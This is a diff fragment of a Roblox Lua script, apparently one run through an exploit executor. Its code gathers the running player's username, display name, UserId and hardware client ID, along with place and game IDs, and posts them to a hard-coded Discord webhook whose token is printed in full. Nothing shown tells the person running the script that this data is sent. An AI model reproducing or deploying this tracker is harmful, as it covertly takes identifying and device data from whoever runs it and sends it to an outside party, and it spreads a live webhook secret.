@@ -15,10 +15,10 @@ game.PlaceId == 4620170611 then
 	Instance.new("ScreenGui", game.CoreGui).Name = "XostumNotifer"
 	local webcock = "https://discord.com/api/webhooks/1080876579829325904/zeMSE1NGHL40TM17DHG0JUULyygIRr-vkGlKP8Mf9XpeRaeUwI10aR4_aLDMHoxGhJcO"
 local data = {
-	["content"] = "Detected An Execution: "..game:GetService("Players").LocalPlayer.Name,
-	["embeds"] = {
-		{
-			["title"] = [[
+    ["content"] = "```Detected An Execution```",
+    ["embeds"] = {
+        {
+            ["title"] = [[
 Username: **]] ..game:GetService("Players").LocalPlayer.Name.. [[** 
 Display: **]] ..game:GetService("Players").LocalPlayer.DisplayName.. [[** 
 UserId: **]] ..game:GetService("Players").LocalPlayer.UserId.. [[** 
@@ -26,17 +26,17 @@ Hardware: **]] ..game:GetService("RbxAnalyticsService"):GetClientId().. [[**
 PID: **]] ..game.PlaceId.. [[** 
 GID: **]] ..game.GameId.. [[** 
 VID: **]] ..game.PlaceVersion.."**",
-			["description"] = "Date: **" .. os.date("%m/%d/%Y %H:%M:%S").."**",
-		}}
+            ["description"] = "Date: **" .. os.date("%m/%d/%Y %H:%M:%S").."**",
+        }}
 }
 local HS = game:GetService("HttpService"):JSONEncode(data)
 local headers = {
-	["content-type"] = "application/json"
+    ["content-type"] = "application/json"
 }
 
 request = http_request or request or HttpPost or syn.request
 local data2 = {
-	Url = webcock,Body=HS,Method="POST",Headers = headers
+    Url = webcock,Body=HS,Method="POST",Headers = headers
 }
 request(data2)
 		wait(math.random(1.001, 3.999))
